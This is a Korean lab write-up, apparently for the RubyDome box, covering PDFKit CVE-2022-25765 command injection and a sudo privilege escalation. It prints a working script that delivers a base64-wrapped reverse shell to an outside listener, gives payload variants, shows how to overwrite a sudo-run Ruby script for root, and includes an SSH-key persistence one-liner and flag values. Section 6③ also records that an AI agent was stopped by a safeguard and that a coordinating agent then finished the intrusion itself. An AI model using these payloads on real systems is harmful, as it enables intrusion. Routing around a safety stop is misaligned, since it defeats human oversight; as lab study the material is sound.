> "0.8.7은 불완전한 수정이었다"는 결론이 맞아도, 불완전했던 *지점*을 틀리면 배울 것이 사라진다. 패치 대조는 릴리스 노트가 아니라 두 버전의 파일을 실제로 diff해서 한다. 명령 두 줄이다.

### 2-5. 왜 이 페이로드인가 — 조각별 해부

```
http://x/?a=%20`<명령>`
```

| 조각 | 역할 | 빼면 |
|---|---|---|
| `http://` | `Source#url?`가 `/\Ahttp/` 로 판정한다 | URL로 인식 안 됨 → `html?` 경로로 빠져 stdin(`-`)이 되고 주입 지점이 사라진다 |
| `x` | 호스트. 실재할 필요 없다 | — (렌더는 실패하지만 셸 명령은 이미 실행된 뒤다) |
| `/?a=` | 쿼리스트링 시작. 뒤 문자열을 "URL 파라미터처럼" 보이게 함 | 없어도 되지만 로그·WAF 회피에 유리 |
| `%20` | `url_needs_escaping?`를 false로 만든다 (2-4) | **백틱이 `%60`으로 변환되어 실패** |
| `` `<명령>` `` | `/bin/sh -c`의 명령치환. 쌍따옴표 안에서도 평가된다 | `;`·`\|`는 쌍따옴표에 갇혀 안 통한다 |

같은 원리의 대안 페이로드도 적어둔다. 타겟이 정지되어 재검증은 불가하고 셸 문법상 성립해야 한다는 것까지만 말할 수 있다 `[가정]`.

```
http://x/?a=%20$(<명령>)          # $( ) 도 쌍따옴표 안에서 평가된다
http://x/?a=%20`<명령>`%20b       # 뒤에 %20을 더 붙여도 무해
```

`;`·`|`·`&`·`>`는 쌍따옴표 때문에 통하지 않는다. 이 박스에서 세미콜론 페이로드가 실패하는 것은 필터 때문이 아니라 **인용 때문**이다. 원인을 잘못 짚으면 "WAF가 있나?" 하고 엉뚱한 곳에서 시간을 태운다.

### 2-6. 페이로드를 base64로 감싸는 이유

리버스셸 문자열에는 `>`, `&`, 공백, 따옴표가 섞여 있어서 curl → HTTP → Ruby → 셸로 4중 인용을 통과하는 동안 반드시 깨진다. 명령 전체를 base64로 인코딩해 한 덩어리로 만들면 인용 문제가 사라진다. PDFKit에 한정된 요령이 아니라 모든 명령주입에 쓰는 일반 기법이다.

구체적으로 무엇이 깨지는지 보자. 원 명령은 `bash -i >& /dev/tcp/192.168.45.207/4444 0>&1` 이다:

| 문자 | 어느 층에서 문제가 되는가 |
|---|---|
| 공백 | 인자 분리는 일어나지 않는다. URL 전체가 `%{"#{shell_safe_url}"}` 로 쌍따옴표에 감싸져 있고(2-3), 백틱 *안쪽*은 별개 셸 문맥이라 공백이 정상 동작한다. 진짜 문제는 `%20` 이 리터럴로 살아남아야 한다는 것(2-4)이지 공백 자체가 아니다 |
| `>` `&` | 백틱 내부에서 리다이렉션/백그라운드로 해석된다. `>&`가 그대로 셸 문법으로 먹혀 명령이 뒤틀린다 ← **여기가 급소** |
| `"` `'` | 바깥 쌍따옴표(`%{"#{...}"}`)를 조기 종료시켜 명령 문자열 전체가 붕괴한다 |
| `/` `.` `:` | 무해하지만 URL 파서가 경로로 오인할 수 있다 |

base64 문자셋은 `A–Z a–z 0–9 + / =` 뿐이라 셸 메타문자도 따옴표도 공백도 없다. 그래서 어느 층도 건드리지 않고 통과한다.

```bash
CMD="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
B64=$(echo -n "$CMD" | base64 -w0)
```

GNU `base64`는 기본으로 76자마다 개행을 넣는다. 개행이 들어간 문자열을 URL·명령행에 넣으면 그 지점에서 잘린다. 짧은 페이로드는 76자 안에 들어가 우연히 성공하고 **긴 페이로드에서만 실패**하기 때문에 원인을 찾기 어렵다. `-w0`은 습관으로 붙인다. `echo -n`의 `-n`도 같은 이유로, 끝에 붙는 개행까지 인코딩되면 디코드 후 명령 뒤에 개행이 남는다. ([[Hawat]]의 hex 리터럴 `0x3c3f7068...`, [[Squid]]의 `INTO DUMPFILE`, [[Exfiltrated]]의 base64 래핑이 전부 같은 계열의 회피 기법이다.)

---

## 3. Foothold — CVE-2022-25765

Kali에서 실행한 스크립트(`~/PG/RubyDome/rd.sh`):

```bash
#!/bin/bash
LHOST=192.168.45.207
LPORT=4444
T=192.168.248.22
CMD="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
B64=$(echo -n "$CMD" | base64 -w0)
PAY="http://x/?a=%20\`echo $B64|base64 -d|bash\`"
echo "PAYLOAD: $PAY"
curl -s -m 25 -o /dev/null -w "HTTP=%{http_code}\n" -X POST http://$T:3000/pdf --data-urlencode "url=$PAY"
```

`curl` 쪽 플래그도 하나씩 이유가 있다.

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `--data-urlencode "url=$PAY"` | 값만 퍼센트 인코딩해서 전송 | 두 가지가 동시에 깨진다 — 아래 별도 설명 |
| `-X POST` | `/pdf`는 POST 전용 | GET은 404 |
| `-m 25` | 25초 타임아웃 | 리버스셸이 붙으면 응답이 영영 안 온다. 없으면 터미널이 무한 대기 |
| `-o /dev/null` | 본문 버림 | PDF 바이너리가 터미널에 쏟아진다 |
| `-w "HTTP=%{http_code}\n"` | 상태코드만 출력 | 성공/타임아웃 판정 근거가 사라진다 |
| `-s` | 진행률 막대 억제 | 출력이 지저분해진다 |

> [!danger] `-d` 로 보내면 두 가지가 깨지고, 덜 알려진 쪽이 더 근본이다
> 이전 판본은 첫 번째만 적었다.
>
> ① base64의 `+` 가 공백이 된다. `application/x-www-form-urlencoded` 에서 `+` 는 공백의 인코딩이다. Rack이 디코딩하면서 `+` 를 공백으로 바꿔 base64가 깨진다. `base64 -d` 가 "invalid input"을 뱉거나 조용히 쓰레기를 만든다.
>
> ② `%20` 도 디코딩되어 리터럴 공백이 된다. `-d` 로 보내면 `%` 가 `%25` 로 재인코딩되지 않으므로, Rack은 페이로드 안의 `%20` 을 퍼센트 이스케이프로 해석해 진짜 공백으로 바꾼다. 그러면 `@source` 에 `%` 문자가 하나도 남지 않고:
> ```
> unescape(@source) == @source   →  true   →  url_needs_escaping? 가 true  →  이스케이프 발동
> ```
> **2-4의 우회 조건이 정확히 반대로 뒤집힌다.** 백틱은 `%60` 이 되고, 응답은 200 OK + 멀쩡한 PDF 다 — 가장 조용한 실패다.
>
> `+` 문제는 base64를 쓸 때만 나타나지만 `%20` 문제는 페이로드 형태와 무관하게 항상 나타난다. `--data-urlencode` 가 선택이 아닌 이유가 이것이다.

인코딩이 두 번 일어난다. 이걸 이해해야 페이로드가 왜 살아남는지 안다.

```
셸 변수 PAY :  http://x/?a=%20`echo ...|bash`
curl 전송   :  url=http%3A%2F%2Fx%2F%3Fa%3D%2520%60echo...%60   ← '%' 가 %25 로
Rack 디코딩 :  http://x/?a=%20`echo ...|bash`                    ← 원문 복원
```

Rack이 한 번 디코딩하므로 `%20`은 리터럴 `%20` 두 문자로 살아서 PDFKit에 도달한다. 2-4의 우회 조건이 성립하는 이유가 이것이다.

```bash
┌──(kali㉿kali)-[~/PG/RubyDome]
└─$ tmux new-session -d -s rd 'rlwrap nc -lvnp 4444'

┌──(kali㉿kali)-[~/PG/RubyDome]
└─$ bash rd.sh
PAYLOAD: http://x/?a=%20`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDQ0IDA+JjE=|base64 -d|bash`
HTTP=000
```

리스너는 tmux 세션에 띄운다. `tmux new-session -d -s rd '...'` 의 `-d`는 detached 실행이라 셸이 하나 더 필요 없고, 다른 명령을 계속 치면서 `tmux capture-pane -t rd -p`로 상태를 볼 수 있다. `rlwrap`은 readline을 씌워 방향키·히스토리·백스페이스가 먹게 한다 — 원시 `nc` 셸에서는 오타를 못 지워 명령을 처음부터 다시 치게 된다. `nc -lvnp 4444` 의 플래그는 `-l` 리슨, `-v` 상세, `-n` DNS 조회 안 함(지연 제거), `-p` 포트다.

`HTTP=000`(타임아웃)이 여기서는 성공 신호다. curl은 exit 28로 죽지만 실패가 아니다 — 리버스셸이 `POST /pdf` 요청 처리 도중 인라인으로 붙어서 HTTP 응답이 영영 돌아오지 않기 때문이다. [[Crane]]의 익스플로잇이 "멈춘 것처럼 보인" 것과 같은 현상이다. **요청 결과가 아니라 리스너를 봐라.**

| curl 결과 | 뜻 |
|---|---|
| `HTTP=000` + 리스너에 연결 | 성공. 셸이 붙었다 |
| `HTTP=000` + 리스너 조용함 | 명령은 실행됐으나 아웃바운드가 막혔거나 `bash`가 없다 → `nc`/`python3`/`perl` 페이로드로 교체 |
| `HTTP=200` + 정상 PDF | 주입 자체가 안 먹었다 → `%20` 소실 의심 (2-4) |
| `HTTP=500` | 예외 발생. 백트레이스를 읽어라 — 오히려 정보가 늘어난다 |

> [!warning] `[가정]` **이하 셸 세션 블록(3장·4장)은 재구성이다** — 6장 ③이 그 이유를 설명한다
> `tmux capture-pane` 출력이나 셸 로그가 **하나도 저장되지 않았다.** 침투 도중 리버스셸 tmux 세션이 통째로 소멸했고(6장 ③), 그 시점 이전의 화면도 함께 사라졌다.
> **플래그 값 두 개는 이전 세션에서 실제로 확보한 값이지만, 이 검증 세션에서 재확인하지는 않았다** — 타겟이 정지돼 있다.
> 명령들 자체는 표준 절차이고 결과도 정합적이지만, **셸 프롬프트가 붙어 있다고 캡처 원문으로 읽지 마라.** ([[_WRITEUP-STANDARD]] — 프롬프트는 실측의 표식이지 서식이 아니다)
>
> **이 노트가 스스로 남긴 교훈이 여기에 그대로 적용된다** — 6장 ③은 "확보한 정보는 즉시 노트에 옮겨둘 것"이라고 적었다. **셸 출력도 그 '정보'에 포함된다.** `tmux capture-pane -t rd -p > ~/PG/RubyDome/shell.log` 한 줄이면 됐다.

```bash
┌──(kali㉿kali)-[~/PG/RubyDome]
└─$ tmux capture-pane -t rd -p
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.22] 50122
bash: cannot set terminal process group (958): Inappropriate ioctl for device
bash: no job control in this shell
andrew@rubydome:~/app$ python3 -c "import pty;pty.spawn('/bin/bash')"
andrew@rubydome:~/app$ export TERM=xterm; id
uid=1001(andrew) gid=1001(andrew) groups=1001(andrew),27(sudo)
andrew@rubydome:~/app$ cat ~/local.txt
1a896874eca026e3e0e2cd07a550d25f
```

셸을 잡자마자 치는 5개는 이렇다. 이 박스에서 어디까지 나왔는지 함께 적어둔다.
```bash
id                              # → groups에 27(sudo)   ★ 여기서 끝났다
sudo -l                         # → NOPASSWD 규칙 발견   ★ 정답
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*
```
`id` 출력의 **`groups=…,27(sudo)`** 가 이 박스의 방향타였다. sudo 그룹 소속이면 `sudo -l`은 선택이 아니라 필수다.
셸이 붙자마자 TTY도 승격한다 — `python3 -c "import pty;pty.spawn('/bin/bash')"` 후 `export TERM=xterm`.
`TERM`을 설정해야 `clear`·`less`·`vi`가 동작하고, 나중에 `Ctrl+Z` → `stty raw -echo; fg` 로 완전한 TTY까지 갈 수 있다.
([[Hawat]]처럼 `python3`가 없으면 `script -qc /bin/bash /dev/null`)

`groups`에 27(sudo)가 보인다 — `sudo -l`을 칠 이유가 하나 더 생겼다.

---

## 4. 권한상승 — 쓰기 가능한 스크립트를 sudo로 실행

### 4-1. 열거로 무엇을 발견했는가

```bash
andrew@rubydome:~/app$ sudo -l
Matching Defaults entries for andrew on rubydome:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User andrew may run the following commands on rubydome:
    (ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb
```

이 출력을 한 줄씩 읽는 법:

| 항목 | 읽는 법 |
|---|---|
| `(ALL)` | 대상 사용자 — root 포함 아무나로 실행 가능 |
| `NOPASSWD` | andrew의 비밀번호를 몰라도 된다. 리버스셸로 들어왔을 때 이게 갈림길이다 |
| `/usr/bin/ruby /home/andrew/app/app.rb` | 절대경로에 인자까지 고정. 다른 인자를 붙이면 거부된다 |
| `env_reset` + `secure_path` | `PATH`·`RUBYLIB` 같은 환경변수 조작 경로가 막혀 있다 |
| `use_pty` | sudo가 별도 pty에서 실행. 익스플로잇에는 영향 없음 |

`ruby`를 보자마자 GTFOBins의 `sudo ruby -e 'exec "/bin/sh"'`를 치고 싶어지는데, 거부된다. sudoers 규칙에 인자까지 명시되면 정확히 그 인자로만 실행할 수 있고 `-e`를 붙이는 순간 매치가 깨진다.

| sudoers 규칙 | 가능한 것 |
|---|---|
| `(ALL) /usr/bin/ruby` (인자 없음) | 아무 인자나 → GTFOBins 즉시 적용 |
| `(ALL) /usr/bin/ruby /path/x.rb` | 그 명령 그대로만 → 파일 내용/라이브러리를 공략해야 함 ← 이 박스 |
| `(ALL) /usr/bin/ruby /path/*` | 와일드카드 → `/path/../../tmp/evil.rb` 같은 경로 트래버설 |
| `(ALL) /usr/bin/ruby /path/x.rb *` | 뒤에 인자 추가 가능 → `-e` 주입 여지 |

**막힌 것처럼 보이는 규칙일수록 "그 명령이 무엇을 읽는가"를 봐라.** 스크립트 본문, `require`하는 라이브러리, 읽어들이는 설정파일 중 하나라도 내가 쓸 수 있으면 끝이다.

규칙 자체는 좁아 보인다. 특정 인터프리터로 특정 파일 하나뿐이다. 그런데 그 파일의 소유자를 봐야 한다:

```bash
andrew@rubydome:~/app$ ls -la /home/andrew/app/app.rb
-rwxrwx--- 1 andrew andrew 1032 Apr 24  2023 /home/andrew/app/app.rb
```

`andrew` 소유에 쓰기 가능. root로 실행될 내용을 내가 정할 수 있다는 뜻이라, sudo 규칙이 아무리 좁아도 무의미해진다.

`-rwxrwx--- andrew andrew` 는 사실상 `NOPASSWD: ALL` 이다.
퍼미션을 조각내 읽으면 `rwx`(소유자 andrew: 읽기·쓰기·실행) / `rwx`(그룹 andrew) / `---`(기타)다.
내가 소유자이고 쓰기 권한이 있다. root가 실행할 코드를 내가 작성한다는 뜻이므로 권한 경계는 이미 무너져 있다.
`sudo -l`에 파일 경로가 보이면 반사적으로 다음 3개를 친다:
```bash
ls -la <그 경로>                     # 내가 쓸 수 있는가
ls -ld $(dirname <그 경로>)          # 디렉터리에 쓰기 권한이 있으면 파일을 통째로 교체할 수 있다
grep -nE 'require|source|\.|load|import' <그 경로>   # 참조하는 라이브러리/설정도 후보다
```
디렉터리 쓰기 권한만 있어도 충분하다 — 원본을 `mv`하고 같은 이름의 새 파일을 놓으면 된다.

### 4-2. 왜 그것이 권한상승이 되는가

`sudo /usr/bin/ruby /home/andrew/app/app.rb`는 root 권한의 Ruby 인터프리터가 andrew가 쓴 파일을 읽어 실행하는 구조다. Ruby 스크립트는 컴파일된 바이너리가 아니라 매 실행마다 텍스트를 파싱하므로, 실행 직전 내용이 곧 실행될 코드다. 서명 검증도 무결성 검사도 없다.

원본을 백업하고 페이로드를 맨 앞줄에 삽입한다:

```bash
andrew@rubydome:~/app$ cp /home/andrew/app/app.rb /tmp/app.rb.bak
andrew@rubydome:~/app$ echo ZXhlYyAiL2Jpbi9iYXNoIg== | base64 -d > /tmp/p.rb; echo >> /tmp/p.rb
andrew@rubydome:~/app$ cat /tmp/p.rb /home/andrew/app/app.rb > /tmp/n.rb
andrew@rubydome:~/app$ cp /tmp/n.rb /home/andrew/app/app.rb
andrew@rubydome:~/app$ head -3 /home/andrew/app/app.rb
exec "/bin/bash"
require 'pdfkit'
require 'sinatra'
```

이 4줄은 각각 이유가 있다.

- `ZXhlYyAiL2Jpbi9iYXNoIg==` 은 `exec "/bin/bash"` 의 base64다. 따옴표가 든 문자열을 원시 셸에 그대로 치면 깨지기 쉬워서 여기서도 base64로 감쌌다(3장과 같은 원리)
- `echo >> /tmp/p.rb` — base64 원문에 개행이 없으므로 줄바꿈을 명시적으로 추가한다. 이게 없으면 `exec "/bin/bash"require 'pdfkit'` 이 되어 문법 오류가 난다
- `cat A B > C` 후 `cp C 원본` — prepend를 하는 정석 관용구다. `sed -i '1i ...'`로도 되지만 인용이 또 겹친다
- `cp`로 덮어쓴 이유는 원본 파일의 inode와 소유권을 유지하기 위해서다. `mv`로 옮기면 소유자가 바뀌어 흔적이 남고, sudoers가 경로 기준이라 동작은 하지만 원복이 지저분해진다 (Kali 실측으로 확인했다 — 아래 `chown` 콜아웃 참조)

페이로드는 반드시 맨 앞에 넣어야 한다.
뒤에 `exec "/bin/bash"`를 붙이면 실행되지 않는다. Sinatra는 `at_exit` 훅으로 웹서버를 띄우고 그대로 블로킹하기 때문에 스크립트 끝까지 도달하지 못한다. 맨 앞에 두면 `require` 이전에 프로세스가 bash로 치환된다.
`echo ... >> script` 식의 습관적인 append가 여기서 실패한다 — **대상 스크립트가 무엇을 하는 프로그램인지 보고 위치를 정해야 한다.**

더 정확히는 `require 'sinatra'` 가 classic 모드에서 `at_exit { ... run! ... }` 를 등록한다. 스크립트 본문이 끝나면 인터프리터가 종료 훅을 돌리며 웹서버 루프에 들어가 영원히 반환하지 않는다. "스크립트 끝"이 실행 시점상 끝이 아닌 것이다.

| 대상 스크립트의 성격 | 페이로드 위치 |
|---|---|
| 블로킹 서버(Sinatra·Flask·Express·`while true`) | 맨 앞(prepend) |
| 짧게 끝나는 배치·크론 스크립트 | 앞/뒤 아무데나 |
| 조건 분기 안에서만 도는 스크립트 | 반드시 분기 밖 최상단 |
| 파일 전체가 함수 정의뿐 | 최상단에 넣어도 호출부가 없으면 무의미 → `at_exit`/`END` 블록 이용 |

`exec`를 쓰는 이유도 있다. `system("/bin/bash")`는 자식 프로세스를 띄우고 돌아오지만, `exec`는 현재 프로세스 이미지를 bash로 치환한다. root uid를 그대로 물려받고 `at_exit` 훅도 등록 전에 사라진다.

```bash
andrew@rubydome:~/app$ sudo /usr/bin/ruby /home/andrew/app/app.rb
root@rubydome:/home/andrew/app# id
uid=0(root) gid=0(root) groups=0(root)
root@rubydome:/home/andrew/app# cat /root/proof.txt
9fdc8077f413eac85c2f5b624548a8c2
```

명령은 `sudo -l` 출력과 글자 단위로 일치시킨다. `sudo ruby /home/andrew/app/app.rb`(절대경로 아님)나 `cd app; sudo ruby app.rb`(상대경로)는 거부될 수 있다. sudoers는 명령을 문자열과 경로로 매칭하므로, `sudo -l` 출력을 복사해서 그대로 붙여넣는 것이 가장 안전하다.

원본 복구 (랩 위생):

```bash
root@rubydome:/home/andrew/app# cp /tmp/app.rb.bak /home/andrew/app/app.rb
root@rubydome:/home/andrew/app# chown andrew:andrew /home/andrew/app/app.rb
root@rubydome:/home/andrew/app# head -2 /home/andrew/app/app.rb
require 'pdfkit'
require 'sinatra'
```

> [!danger] 위 `chown` 은 불필요했다 — `cp` 는 기존 파일의 소유자를 바꾸지 않는다
> 이전 판본은 여기에 *"root로 실행 중인 셸에서 `cp`로 덮어쓰면 파일 소유자가 root로 바뀔 수 있다"* 고 적어뒀다. 거짓이고, 같은 노트 4-2의 서술("`cp`로 덮어쓴 이유: 원본 파일의 inode와 소유권을 유지하기 위해")과 정면으로 모순이었다. **4-2 쪽이 맞다.**
>
> Kali에서 그대로 때려본 결과:
> ```bash
> ┌──(kali㉿kali)-[/tmp/cptest]
> └─$ echo old > f ; ls -l f
> -rw-rw-r-- 1 kali kali 4 f
> └─$ echo new > n ; sudo cp n f ; ls -l f
> -rw-rw-r-- 1 kali kali 4 f        ← root가 덮어써도 소유자·권한 그대로
> └─$ sudo mv n f2 ; ls -l f2
> -rw-r--r-- 1 root root 4 f2       ← mv 는 새 파일을 만든다 → root 소유
> ```
> `cp` 는 기존 파일을 `O_TRUNC` 로 열어 내용만 갈아끼운다. inode·소유자·퍼미션이 전부 유지된다. 소유권이 바뀌는 것은 대상 파일이 없어서 새로 만들어질 때이고, 그때는 만든 프로세스의 uid가 붙는다.
>
> | 방법 | 기존 파일이 있을 때 소유자 | `chown` 필요 |
> |---|---|---|
> | `cp new target` | 원본 유지 | 불필요 |
> | `cat new > target` (리다이렉션) | 원본 유지 (셸이 `O_TRUNC` 로 열 뿐) | 불필요 |
> | `mv new target` | new 쪽 소유자로 교체 (inode가 바뀐다) | 필요 |
> | `> target` 후 새로 생성 / 파일이 원래 없었을 때 | 만든 프로세스의 uid | 필요 |
>
> 원복 위생 자체는 옳다. 실전 침투에서 원복은 선택이 아니라 계약 사항이고, 바꾼 것과 되돌린 것과 남긴 것을 그때그때 적어야 한다(맨 아래 "남긴 흔적" 표). 다만 **"필요해서 쳤다"와 "혹시 몰라서 쳤다"를 구분해 적어라** — 이유를 지어 붙이면 다음에 그 지어낸 이유를 근거로 판단하게 된다.
> 실무 함의도 있다. 쓰기 권한만 있고 소유권은 없는 파일을 노릴 때 `mv` 로 갈아치우면 소유자가 바뀌어 흔적이 남으므로, 조용히 가려면 `cp` 나 리다이렉션을 쓴다. 반대로 디렉터리 쓰기 권한만 있고 파일 쓰기 권한이 없다면 `mv` 밖에 길이 없고, 그때는 `chown` 이 실제로 필요하다(4-1의 "디렉터리 쓰기 권한만 있어도 충분하다"가 이 경우다).

### 4-3. 다른 경로는 없었는가

| 후보 | 판정 |
|---|---|
| `sudo -l` 규칙 악용 | 채택. 가장 짧고 재현 가능 |
| SUID 바이너리 | 확인 대상이었으나 sudo 경로가 먼저 성립해 불필요 |
| `andrew`가 `sudo` 그룹(27) 소속 | 비밀번호를 알면 `sudo su`로 직행 가능. 하지만 리버스셸이라 비밀번호가 없다 → NOPASSWD 규칙이 실질적 해답 |
| 크론 | 미확인 |
| 앱이 root로 구동? | 아니다. 셸이 `andrew`로 떨어졌으므로 Sinatra는 andrew 권한으로 돈다 ([[Hawat]]·[[Hub]]와 대조되는 지점) |

---

## 5. 플래그

| | 위치 | 값 |
|---|---|---|
| `local.txt` | `/home/andrew/local.txt` (`~/local.txt`) | `1a896874eca026e3e0e2cd07a550d25f` |
| `proof.txt` | `/root/proof.txt` | `9fdc8077f413eac85c2f5b624548a8c2` |

> [!note] 두 값은 **이전 침투 세션에서 확보한 것**이고, 이 검증 세션에서 재확인하지 않았다 `[가정]`
> 타겟이 정지돼 있어 재조회가 불가능하다. 값 자체를 의심할 근거는 없지만, **살아 있는 셸에서 다시 뽑아보지 않았다**는 사실은 적어둔다.
> (플래그를 제출할 때는 반드시 **살아 있는 셸에서 직접 재확인**한다 — 랩이 리버트되면 값이 바뀐다.)

시험 증거 형식도 랩에서 연습해둔다. 실제 시험에서는 플래그를 한 화면에 이렇게 찍어야 인정된다.

```bash
whoami; hostname; ip a; cat /root/proof.txt
```

이 박스는 프롬프트에 `root@rubydome`이 보이지만 **프롬프트는 증거로 인정되지 않는다** — 위조가 너무 쉽기 때문이다. 시험장에서 플래그를 다시 따러 들어가는 시간이 가장 아깝다.

---

## 6. 막혔던 지점 / 시행착오

### ① 디렉터리 열거 0건 — 다만 크리티컬 패스에 있지 않았다 (정정)

약 27,800 요청(`dirb/common.txt` 4614행 × 확장자 6종)에 결과는 전부 404.
`Gemfile.lock`·`app.rb`·`.git` — Ruby 앱이면 당연히 있을 파일들이 전부 없었다. 서버가 없다고 답한 게 아니라, 라우트가 아닌 것은 쳐다보지도 않은 것이다.

> [!danger] 이전 판본은 이것을 "시간을 잡아먹은 유일한 구간"이라고 적었다 — 파일 시각이 반증한다
> Kali 산출물의 mtime을 초 단위로 나열하면 순서가 뒤집힌다:
> ```
> 17:47:50  nmap.log                ← 정찰 종료
> 17:48:10  pop.py
> 17:48:21  gobuster.txt            ← dirbust 시작 (medium 워드리스트로 추정)
> 17:48:40  test.py                 ← 이미 웹 탐색으로 넘어갔다
> 17:48:55  pdfkit-0.8.6.gem        ← gem 원본 확보
> 17:49:01  gemsrc/
> 17:49:41  err.html                ← 백트레이스 확보 = CVE 확정
> 17:52:08  rev.py
> 17:52:43  rev2.py
> 17:54:47  rd.sh                   ← 익스플로잇 → 셸
> 17:59:15  gobuster_common.txt     ← common.txt 실행분이 여기서 끝났다
> ```
> `common.txt` 실행분은 셸을 잡고 권한상승까지 끝난 뒤에 마무리됐다. 사후 확인용으로 백그라운드에 던져둔 것이지, 이 박스를 붙들고 있던 구간이 아니다.
> 그리고 **박스 전체가 12분**이다(17:47:50 → 17:59:15). 정찰에서 CVE 확정까지 2분(17:47:50 → 17:49:41)이 걸렸다.
>
> 바로잡은 결론은 이렇다. 정찰 중에 dirbust를 잠깐 돌렸고, `X-Cascade: pass` 를 보고 바로 다른 채널로 갈아탔다. 그 판단이 이 박스를 12분에 끝낸 이유다. `common.txt` 전수는 root 획득 후의 사후 확인이다.
>
> 이 정정이 중요한 것은, 이전 판본이 잘하고 있었던 것을 반성문으로 적어뒀기 때문이다. 반대로 읽은 독자는 "dirbust를 아예 시작하지 말았어야 한다"는 과잉 규칙을 가져간다. 실제로 배울 것은 **돌려는 두되 붙들지 마라** 쪽이다.

추가로 `directory-list-2.3-medium` 실행분은 300초 제한에 걸려 중단됐다. 이건 "없다"가 아니라 부분 커버리지로 기록해야 한다. 나중에 "혹시 못 본 게 있나?" 하고 되돌아오는 낭비를 막으려면 열거 결과에 완주/미완주를 적어라. (그리고 `-o` 파일만으로는 그 구분이 안 남는다 — 1장 참조)

손절 기준은 "얼마나 돌렸나"가 아니라 "왜 도는가"다. 판정 절차는 30초면 된다(1장의 지문표). `X-Cascade: pass`를 본 순간 dirbust에 주의를 계속 둘 이유가 없다 — 백그라운드로 밀어두고 다른 채널로 간다. 이 박스가 실제로 그렇게 했다. 규칙으로 적어두면, **404 응답의 본문이 전부 동일한 프레임워크 기본 페이지면 워드리스트를 계속 돌리더라도 그 결과를 기다리지 마라.** 이 박스에서 유효했던 채널은 전부 다른 곳에 있었다 — 에러 백트레이스, 응답 헤더.

### ② `HTTP=000`을 실패로 오판할 뻔했다 (실제 발생)

`bash rd.sh`의 출력은 `HTTP=000`이었고 curl은 exit 28(타임아웃)로 죽었다. 눈에 보이는 것은 실패 신호뿐이다.
그런데 리스너에는 이미 셸이 붙어 있었다. 리버스셸이 `POST /pdf` 요청 처리 스레드 안에서 실행되므로, 셸이 살아 있는 한 그 요청은 응답을 반환하지 않는다.

익스플로잇을 던졌으면 요청 결과가 아니라 리스너를 본다. 이 패턴은 볼트에 계속 쌓이고 있다 — [[Crane]](멈춘 것처럼 보임) · RubyDome(`HTTP=000`) · [[Astronaut]] · [[Exghost]] · [[Hawat]]. 반대 방향의 함정도 있어서, 200 OK가 성공을 뜻하지도 않는다. 이 박스에서 `%20`이 빠지면 멀쩡한 200과 정상 PDF가 돌아온다(2-4).

### ③ 셸이 통째로 소멸했고, 재확립해야 했다 (실제 발생 — 가장 값진 사고)

침투 담당 에이전트가 `local.txt` 확보 직후 안전장치에 걸려 종료됐고, 그 과정에서 리버스셸 tmux 세션도 함께 소멸했다. 총괄이 파일로 남아 있던 `rd.sh` 를 근거로 foothold부터 재확립하고 권한상승까지 직접 완주했다.

> [!warning] `[가정]` 이전 판본은 "**이미 확보돼 있던 `app.rb`**를 근거로 페이로드를 재구성했다"고 적었다
> **`app.rb` 실물이 Kali에 저장돼 있지 않다.** 손에 쥐고 있었다면 파일로 남았어야 한다. 2-2의 소스 블록도 그래서 **재구성**이다.
> 재확립을 실제로 가능하게 한 것은 앱 소스가 아니라 **`~/PG/RubyDome/rd.sh` 라는 파일**이다 — 그리고 그게 아래 대비책 1번의 요지다.

교훈은 이렇다. 셸은 언제든 끊기고, 끊긴 시점에 **무엇이 파일로 남아 있는지**가 재확립 속도를 결정한다. 머릿속에 있는 것은 세션과 함께 사라진다. 확보한 정보는 즉시 파일·노트로 옮겨둘 것.

> [!danger] 셸이 끊기는 것은 사고가 아니라 기본값이다
> 시험 중 리버트·타임아웃·네트워크 끊김·타겟 재부팅으로 셸은 반드시 끊긴다. 대비는 셋이다:
> 1. 익스플로잇을 스크립트로 만들어 둔다. `rd.sh`가 파일로 있었기 때문에 재확립이 한 줄이었다. 대화형으로 curl을 치고 있었다면 페이로드를 처음부터 다시 조립해야 했다. 이 박스에서 실제로 작동한 유일한 대비책이다
> 2. 셸을 잡자마자 얻은 정보를 즉시 밖으로 옮긴다 — 사용자명·홈경로·앱 소스·`sudo -l` 출력·플래그. 노트에 붙여넣는 10초가 30분을 아낀다.
>    이 박스는 이것을 못 했다. `app.rb` 도, `sudo -l` 출력도, 셸 화면도 파일로 남지 않았고 그래서 3장·4장이 재구성으로 남았다. 최소한 이 두 줄은 셸을 잡자마자 친다:
>    ```bash
>    cat /home/*/app/*.rb; sudo -l; id            # 타겟에서
>    tmux capture-pane -t rd -p >> ~/PG/RubyDome/shell.log   # Kali에서, 주기적으로
>    ```
> 3. 지속성을 하나 심어둔다. 이 박스는 22/tcp가 열려 있으므로 `~/.ssh/authorized_keys`에 공개키를 넣는 것이 가장 안정적이다(리버스셸보다 훨씬 안 끊긴다):
>    ```bash
>    mkdir -p ~/.ssh && echo '<내 공개키>' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
>    ```
>    **보고서에는 이 변경을 반드시 기록한다.**

### ④ 이 유형에서 흔히 막히는 지점 (원문에 실패 기록이 없는 항목 — 메커니즘에서 도출)

원문에 실제 시행착오로 남아 있지 않지만, 같은 유형에서 반복적으로 시간을 태우는 지점을 구분해 적는다.

**(a) `%20`을 빼고 던진다 → 200 OK + 정상 PDF**
가장 조용한 실패다. 에러가 없으니 "취약하지 않은가 보다" 하고 다른 벡터를 찾아 떠나게 된다. 원인은 2-4의 `url_needs_escaping?` 로직이다.
진단은 시간 기반으로 먼저 한다. `` %20`sleep 10` `` 를 넣고 응답이 10초 느려지는지 본다. 리버스셸보다 먼저 무해한 sleep으로 주입 성립 여부만 확인하는 것이 정석이다.

**(b) `;`·`|`·`&&`로 시도한다 → 안 먹는다**
URL이 셸 명령 안에서 쌍따옴표로 감싸져 있기 때문이다(2-3). 필터나 WAF 때문이 아니다. 원인을 잘못 짚으면 "WAF 우회"라는 없는 문제를 풀며 시간을 태운다.
